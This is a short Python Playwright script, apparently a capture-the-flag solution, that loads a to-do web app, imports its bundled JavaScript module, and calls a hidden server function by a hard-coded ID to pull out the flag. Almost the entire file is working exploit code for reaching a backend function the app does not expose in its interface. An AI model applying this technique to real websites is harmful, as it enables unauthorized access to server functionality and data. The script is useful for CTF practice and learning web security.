#!/usr/bin/env python3
from playwright.sync_api import sync_playwright


URL = "http://todo.squ1rrel.dev"
HIDDEN_FN_ID = "3633763ff4da33d65cb24e276f877dcaa1972bfb59429377abc55a408a83167a"


def main():
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        page.goto(URL, wait_until="networkidle")

        result = page.evaluate(
            """
            async (hiddenId) => {
              const m = await import('/assets/routes-LxaxDcib.js');
              const hiddenFn = m.g(hiddenId);
              return await hiddenFn({
                method: 'POST',
                data: {
                  field1: 'anything',
                  field2: 1
                }
              });
            }
            """,
            HIDDEN_FN_ID,
        )

        browser.close()

    flag = result.get("result")
    if not flag:
        raise RuntimeError(f"Gagal mendapatkan flag. Response: {result}")
    print(flag)


if __name__ == "__main__":
    main()
